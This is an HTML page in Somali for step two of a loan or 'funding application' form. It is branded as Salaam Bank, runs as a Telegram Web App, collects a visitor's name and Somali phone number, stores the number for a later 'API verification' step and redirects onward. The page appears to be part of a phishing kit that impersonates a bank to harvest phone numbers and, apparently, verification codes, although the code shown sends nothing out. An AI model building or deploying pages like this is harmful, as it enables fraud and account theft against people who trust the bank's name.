<!DOCTYPE html>
<html lang="so">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Codsiga Maalgelinta - Talaabada 2aad</title>

    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #0d1b2a; /* Dark Blue Base Background */
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #e2e8f0;
        }

        .nav-header {
            width: 100%;
            background: linear-gradient(135deg, #001f3f 0%, #003366 100%);
            padding: 18px 20px;
            color: #f8fafc;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-sizing: border-box;
            border-bottom: 2px solid #1e3a5f;
        }

        .bank-logo {
            font-size: 22px;
            font-weight: bold;
        }

        .form-card {
            background: #1b2a4a; /* Dark Blue Card Background */
            width: 92%;
            max-width: 480px;
            margin-top: 25px;
            padding: 30px 20px;
            border-radius: 12px;
            border: 1px solid #2a3d66;
            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
            box-sizing: border-box;
        }

        .progress-box {
            display: flex;
            gap: 8px;
            margin-bottom: 35px;
        }

        .bar {
            height: 4px;
            flex: 1;
            background: #1e293b;
            border-radius: 2px;
        }

        .active-bar {
            background: #38bdf8; /* Highlight Accent Blue */
        }

        .input-wrap {
            margin-bottom: 25px;
        }

        label {
            display: block;
            font-size: 15px;
            font-weight: 500;
            margin-bottom: 12px;
            color: #cbd5e1; /* Off-White */
        }

        input {
            width: 100%;
            padding: 16px;
            border: 1px solid #334155;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
            background-color: #0f172a;
            color: #f8fafc;
            outline: none;
        }

        input:focus {
            border-color: #38bdf8;
        }

        input::placeholder {
            color: #64748b;
        }

        .phone-container {
            display: flex;
            gap: 10px;
        }

        .country-code {
            width: 85px;
            background: #1e293b;
            text-align: center;
            font-weight: bold;
            border: 1px solid #334155;
            line-height: 52px;
            color: #38bdf8;
            border-radius: 10px;
            font-size: 16px;
        }

        .phone-input {
            flex: 1;
        }

        .phone-hint {
            font-size: 13px;
            color: #94a3b8;
            margin-top: 10px;
        }

        .btn-container {
            margin-top: 40px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .back-btn {
            background-color: #1e293b;
            color: #cbd5e1;
            border: 1px solid #334155;
            width: 100%;
            padding: 18px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
        }

        .next-btn {
            background: linear-gradient(135deg, #003366 0%, #004080 100%);
            color: #f8fafc;
            border: 1px solid #1e40af;
            width: 100%;
            padding: 18px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            text-transform: uppercase;
            transition: background 0.3s ease;
        }

        .next-btn:active {
            background: #002244;
        }

        .footer-text {
            text-align: center;
            font-size: 12px;
            color: #64748b;
            margin: 40px 0 30px;
        }
    </style>
</head>

<body>

<div class="nav-header">
    <div onclick="goBack()" style="cursor:pointer; font-size:18px; color: #cbd5e1;">← Dib u noqyo</div>
    <div class="bank-logo">Salaam Bank</div>
    <div style="font-size: 24px;">☰</div>
</div>

<div class="form-card">
    <div class="progress-box">
        <div class="bar active-bar"></div>
        <div class="bar active-bar"></div>
        <div class="bar"></div>
    </div>

    <div class="input-wrap">
        <label>Magaca Koowaad</label>
        <input type="text" id="firstName" placeholder="Tusaale: Axmed">
    </div>

    <div class="input-wrap">
        <label>Magaca Labaad</label>
        <input type="text" id="lastName" placeholder="Tusaale: Cali">
    </div>

    <div class="input-wrap">
        <label>Nambarka Telefoonka</label>
        <div class="phone-container">
            <div class="country-code">+252</div>
            <input type="tel" id="phone" class="phone-input" placeholder="61XXXXXXX" maxlength="9">
        </div>
        <p class="phone-hint">Geli 9 tiro oo shaqaynaya (tusaale: 615123456)</p>
    </div>

    <div class="btn-container">
        <button type="button" class="back-btn" onclick="goBack()">DIB U NOQO</button>
        <button type="button" class="next-btn" onclick="goNext()">TALAABADA XIGTA</button>
    </div>
</div>

<div class="footer-text">© 2026 Salaam Bank Somalia. Hantida oo dhan waa la dhowray.</div>

<script>
    function goNext() {
        const fName = document.getElementById('firstName').value.trim();
        const lName = document.getElementById('lastName').value.trim();
        const phone = document.getElementById('phone').value.trim();

        if (!fName || !lName || !phone) {
            alert("Fadlan buuxi dhammaan meelaha bannaanka ah.");
            return;
        }

        if (!/^\d{8,9}$/.test(phone)) {
            alert("Fadlan geli nambar telefoon oo sax ah.");
            return;
        }

        // Save for general flow
        localStorage.setItem('firstName', fName);
        localStorage.setItem('lastName', lName);
        localStorage.setItem('phone', phone);
        
        // CRITICAL: Save specifically for the API verification
        localStorage.setItem('userPhone', phone);

        window.location.href = "/page4";
    }

    function goBack() {
        window.location.href = "/page2";
    }

    window.onload = () => {
        const tg = window.Telegram?.WebApp;
        if (tg) {
            tg.ready();
            tg.expand();
        }

        // Auto-fill existing data
        const f = localStorage.getItem('firstName');
        const l = localStorage.getItem('lastName');
        const p = localStorage.getItem('phone');

        if (f) document.getElementById('firstName').value = f;
        if (l) document.getElementById('lastName').value = l;
        if (p) document.getElementById('phone').value = p;
    };
</script>

</body>
</html>
